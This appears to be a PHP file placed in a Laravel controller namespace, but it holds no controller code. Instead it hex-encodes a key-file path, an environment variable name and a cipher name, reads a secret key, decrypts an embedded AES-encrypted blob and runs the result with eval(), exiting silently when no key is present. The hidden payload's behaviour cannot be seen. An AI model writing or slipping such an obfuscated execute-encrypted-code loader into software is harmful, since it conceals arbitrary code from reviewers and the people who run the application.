<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('xV/vo0MLHgw7PQoSglnT1g==');

$c=base64_decode(

'8Kjn9zg2GMjyxdn4zBpJNtBokUp4qalx3WCuQpU7mjtt4js+GR+lIl0TAeNOyVvOoUybnoD/gMiW' .
'CGllQCm4a7phNfwCZWAowVFoZiO89ZYff+ErPF21Ejp5674dvHavXUfi8Z2oSMDQ5BLBegWC668D' .
'/lMzCPKkGFL8wMvbUkaqAv2l3GpBIqvP1rKRZrtNphfobzFLkm8vbqLqiMlqGJ5BqAzkjg1/rk6F' .
'ZZxgz33SED5X118tAefuZKZ7Y7mmno6V5AM13dphxLbfG9yPQ6vNGj1uOTuOWGx98D5L+Qg='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

